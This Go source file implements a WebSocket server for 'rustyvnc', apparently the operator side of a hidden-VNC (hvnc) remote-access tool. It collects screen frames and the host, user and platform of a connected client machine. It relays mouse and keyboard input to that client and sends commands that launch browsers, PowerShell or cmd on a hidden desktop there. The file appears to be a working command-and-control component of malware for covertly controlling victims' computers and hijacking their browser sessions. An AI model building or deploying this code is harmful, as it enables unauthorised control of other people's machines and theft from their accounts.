package main

import (
	"embed"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

//go:embed web/index.html
var webFS embed.FS

const (
	frameNoChange byte = 0x00
	frameJPEG     byte = 0x01
	inputMsg      byte = 0x02
	controlMsg    byte = 0x03

	maxFrameSize = 5 << 20
)

type hub struct {
	mu sync.RWMutex

	client  *peer
	viewers map[*peer]struct{}

	clientID   uuid.UUID
	connID     uuid.UUID
	hvncActive bool
	width      uint32
	height     uint32
	frameSeq   uint64
	frame      []byte
}

type peer struct {
	conn      *websocket.Conn
	send      chan outbound
	closeOnce sync.Once
}

type outbound struct {
	kind int
	data []byte
}

type clientEvent struct {
	Type     string    `json:"type"`
	ClientID uuid.UUID `json:"client_id"`
	ConnID   uuid.UUID `json:"conn_id,omitempty"`
	Platform string    `json:"platform,omitempty"`
	User     string    `json:"user,omitempty"`
	Host     string    `json:"host,omitempty"`
	Message  string    `json:"message,omitempty"`
}

type viewerRequest struct {
	Type    string `json:"type"`
	Quality int    `json:"quality,omitempty"`
	Action  string `json:"action,omitempty"`
	Msg     uint32 `json:"msg,omitempty"`
	WParam  uint32 `json:"wparam,omitempty"`
	LParam  uint32 `json:"lparam,omitempty"`
}

type serverCommand struct {
	Type    string `json:"type"`
	Quality int    `json:"quality,omitempty"`
}

type statusEvent struct {
	Type       string    `json:"type"`
	Connected  bool      `json:"connected"`
	Active     bool      `json:"active"`
	ClientID   uuid.UUID `json:"client_id,omitempty"`
	ConnID     uuid.UUID `json:"conn_id,omitempty"`
	Width      uint32    `json:"width,omitempty"`
	Height     uint32    `json:"height,omitempty"`
	FrameSeq   uint64    `json:"frame_seq"`
	Message    string    `json:"message,omitempty"`
	ServerTime time.Time `json:"server_time"`
}

var upgrader = websocket.Upgrader{
	ReadBufferSize:  32 * 1024,
	WriteBufferSize: 32 * 1024,
	CheckOrigin: func(r *http.Request) bool {
		host := r.Host
		if strings.HasPrefix(host, "127.0.0.1:") || strings.HasPrefix(host, "localhost:") {
			return true
		}
		return r.Header.Get("Origin") == ""
	},
}

func main() {
	addr := flag.String("addr", "127.0.0.1:7070", "listen address")
	token := flag.String("token", "", "optional shared token for client/viewer WebSocket access")
	flag.Parse()

	h := &hub{viewers: make(map[*peer]struct{})}
	mux := http.NewServeMux()
	mux.HandleFunc("/", serveIndex)
	mux.HandleFunc("/ws/client", h.auth(*token, h.serveClient))
	mux.HandleFunc("/ws/viewer", h.auth(*token, h.serveViewer))

	log.Printf("rustyvnc server listening on http://%s", *addr)
	log.Fatal(http.ListenAndServe(*addr, mux))
}

func serveIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	data, err := webFS.ReadFile("web/index.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = w.Write(data)
}

func (h *hub) auth(token string, next func(http.ResponseWriter, *http.Request)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if token == "" {
			next(w, r)
			return
		}
		got := r.URL.Query().Get("token")
		if got == "" && strings.HasPrefix(r.Header.Get("Authorization"), "Bearer ") {
			got = strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
		}
		if got != token {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

func (h *hub) serveClient(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	id, _ := uuid.Parse(r.URL.Query().Get("id"))
	if id == uuid.Nil {
		id = uuid.New()
	}
	p := newPeer(conn)

	h.mu.Lock()
	if h.client != nil {
		h.client.close()
	}
	h.client = p
	h.clientID = id
	h.connID = uuid.Nil
	h.hvncActive = false
	h.width = 0
	h.height = 0
	h.frameSeq = 0
	h.frame = nil
	h.mu.Unlock()

	log.Printf("client connected id=%s remote=%s", id, r.RemoteAddr)
	h.broadcastStatus("client connected")
	go p.writer()
	p.reader(func(kind int, data []byte) error {
		if kind == websocket.TextMessage {
			return h.handleClientText(data)
		}
		if kind == websocket.BinaryMessage {
			return h.handleClientBinary(data)
		}
		return nil
	})

	h.mu.Lock()
	if h.client == p {
		h.client = nil
		h.hvncActive = false
	}
	h.mu.Unlock()
	p.close()
	h.broadcastStatus("client disconnected")
	log.Printf("client disconnected id=%s", id)
}

func (h *hub) serveViewer(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	p := newPeer(conn)

	h.mu.Lock()
	h.viewers[p] = struct{}{}
	h.mu.Unlock()

	log.Printf("viewer connected remote=%s", r.RemoteAddr)
	go p.writer()
	p.sendJSON(h.status(""))
	h.sendLatestFrame(p)

	p.reader(func(kind int, data []byte) error {
		if kind != websocket.TextMessage {
			return nil
		}
		var req viewerRequest
		if err := json.Unmarshal(data, &req); err != nil {
			p.sendJSON(h.status("invalid request: " + err.Error()))
			return nil
		}
		if err := h.handleViewerRequest(req); err != nil {
			p.sendJSON(h.status(err.Error()))
		}
		return nil
	})

	h.mu.Lock()
	delete(h.viewers, p)
	h.mu.Unlock()
	p.close()
	log.Printf("viewer disconnected")
}

func newPeer(conn *websocket.Conn) *peer {
	return &peer{
		conn: conn,
		send: make(chan outbound, 128),
	}
}

func (p *peer) writer() {
	for item := range p.send {
		_ = p.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
		if err := p.conn.WriteMessage(item.kind, item.data); err != nil {
			return
		}
	}
}

func (p *peer) reader(fn func(kind int, data []byte) error) {
	defer p.close()
	p.conn.SetReadLimit(maxFrameSize + 1024)
	for {
		kind, data, err := p.conn.ReadMessage()
		if err != nil {
			return
		}
		if err := fn(kind, data); err != nil {
			log.Printf("websocket handler error: %v", err)
			return
		}
	}
}

func (p *peer) close() {
	p.closeOnce.Do(func() {
		close(p.send)
		_ = p.conn.Close()
	})
}

func (p *peer) sendJSON(v any) {
	data, _ := json.Marshal(v)
	p.enqueue(websocket.TextMessage, data)
}

func (p *peer) enqueue(kind int, data []byte) {
	defer func() {
		_ = recover()
	}()
	select {
	case p.send <- outbound{kind: kind, data: data}:
	default:
	}
}

func (h *hub) handleClientText(data []byte) error {
	var evt clientEvent
	if err := json.Unmarshal(data, &evt); err != nil {
		return err
	}
	switch evt.Type {
	case "hello":
		log.Printf("client hello id=%s host=%s user=%s platform=%s", evt.ClientID, evt.Host, evt.User, evt.Platform)
	case "started":
		h.mu.Lock()
		h.clientID = evt.ClientID
		h.connID = evt.ConnID
		h.hvncActive = true
		h.mu.Unlock()
		h.broadcastStatus("hvnc started")
	case "stopped":
		h.mu.Lock()
		h.hvncActive = false
		h.connID = uuid.Nil
		h.mu.Unlock()
		h.broadcastStatus("hvnc stopped")
	case "error":
		log.Printf("client error: %s", evt.Message)
		h.broadcastStatus(evt.Message)
	case "pong":
	default:
		log.Printf("unknown client event: %s", evt.Type)
	}
	return nil
}

func (h *hub) handleClientBinary(data []byte) error {
	if len(data) == 0 {
		return nil
	}
	switch data[0] {
	case frameNoChange:
		return nil
	case frameJPEG:
		if len(data) < 9 {
			return nil
		}
		width := binary.LittleEndian.Uint32(data[1:5])
		height := binary.LittleEndian.Uint32(data[5:9])
		if width == 0 || height == 0 || width > 8192 || height > 8192 {
			return fmt.Errorf("invalid frame dimensions %dx%d", width, height)
		}
		jpeg := data[9:]
		if len(jpeg) > maxFrameSize {
			return fmt.Errorf("frame too large: %d", len(jpeg))
		}
		frame := append([]byte(nil), jpeg...)
		h.mu.Lock()
		h.width = width
		h.height = height
		h.frame = frame
		h.frameSeq++
		viewerFrame := h.viewerFrameLocked(frame, width, height)
		viewers := h.viewerListLocked()
		h.mu.Unlock()
		for _, viewer := range viewers {
			viewer.enqueue(websocket.BinaryMessage, viewerFrame)
		}
	default:
		return fmt.Errorf("unknown client binary marker 0x%02x", data[0])
	}
	return nil
}

func (h *hub) handleViewerRequest(req viewerRequest) error {
	switch req.Type {
	case "status":
		h.broadcastStatus("")
	case "start":
		quality := req.Quality
		if quality == 0 {
			quality = 70
		}
		if quality < 10 {
			quality = 10
		}
		if quality > 95 {
			quality = 95
		}
		return h.sendClientJSON(serverCommand{Type: "start", Quality: quality})
	case "stop":
		return h.sendClientJSON(serverCommand{Type: "stop"})
	case "launch":
		action := actionFromString(req.Action)
		if action == 0 {
			return fmt.Errorf("unknown launch action: %s", req.Action)
		}
		return h.sendClientBinary(controlPacket(action))
	case "input":
		return h.sendClientBinary(inputPacket(req.Msg, req.WParam, req.LParam))
	default:
		return fmt.Errorf("unknown request type: %s", req.Type)
	}
	return nil
}

func (h *hub) sendClientJSON(v any) error {
	data, _ := json.Marshal(v)
	return h.sendClient(websocket.TextMessage, data)
}

func (h *hub) sendClientBinary(data []byte) error {
	return h.sendClient(websocket.BinaryMessage, data)
}

func (h *hub) sendClient(kind int, data []byte) error {
	h.mu.RLock()
	client := h.client
	h.mu.RUnlock()
	if client == nil {
		return errors.New("no client connected")
	}
	client.enqueue(kind, data)
	return nil
}

func (h *hub) sendLatestFrame(p *peer) {
	h.mu.RLock()
	if len(h.frame) == 0 {
		h.mu.RUnlock()
		return
	}
	frame := append([]byte(nil), h.frame...)
	width := h.width
	height := h.height
	data := h.viewerFrameLocked(frame, width, height)
	h.mu.RUnlock()
	p.enqueue(websocket.BinaryMessage, data)
}

func (h *hub) broadcastStatus(message string) {
	status := h.status(message)
	h.mu.RLock()
	viewers := h.viewerListLocked()
	h.mu.RUnlock()
	for _, viewer := range viewers {
		viewer.sendJSON(status)
	}
}

func (h *hub) status(message string) statusEvent {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return statusEvent{
		Type:       "status",
		Connected:  h.client != nil,
		Active:     h.hvncActive,
		ClientID:   h.clientID,
		ConnID:     h.connID,
		Width:      h.width,
		Height:     h.height,
		FrameSeq:   h.frameSeq,
		Message:    message,
		ServerTime: time.Now().UTC(),
	}
}

func (h *hub) viewerListLocked() []*peer {
	viewers := make([]*peer, 0, len(h.viewers))
	for viewer := range h.viewers {
		viewers = append(viewers, viewer)
	}
	return viewers
}

func (h *hub) viewerFrameLocked(jpeg []byte, width, height uint32) []byte {
	clientID := h.clientID
	clientBytes, _ := clientID.MarshalBinary()
	buf := make([]byte, 16+4+4+len(jpeg))
	copy(buf[0:16], clientBytes)
	binary.LittleEndian.PutUint32(buf[16:20], width)
	binary.LittleEndian.PutUint32(buf[20:24], height)
	copy(buf[24:], jpeg)
	return buf
}

func inputPacket(msg, wparam, lparam uint32) []byte {
	buf := make([]byte, 13)
	buf[0] = inputMsg
	binary.LittleEndian.PutUint32(buf[1:5], msg)
	binary.LittleEndian.PutUint32(buf[5:9], wparam)
	binary.LittleEndian.PutUint32(buf[9:13], lparam)
	return buf
}

func controlPacket(action uint32) []byte {
	buf := make([]byte, 5)
	buf[0] = controlMsg
	binary.LittleEndian.PutUint32(buf[1:5], action)
	return buf
}

func actionFromString(name string) uint32 {
	switch strings.ToLower(name) {
	case "explorer":
		return 1
	case "run":
		return 2
	case "chrome":
		return 3
	case "edge":
		return 4
	case "brave":
		return 5
	case "firefox":
		return 6
	case "powershell":
		return 7
	case "cmd":
		return 8
	default:
		return 0
	}
}
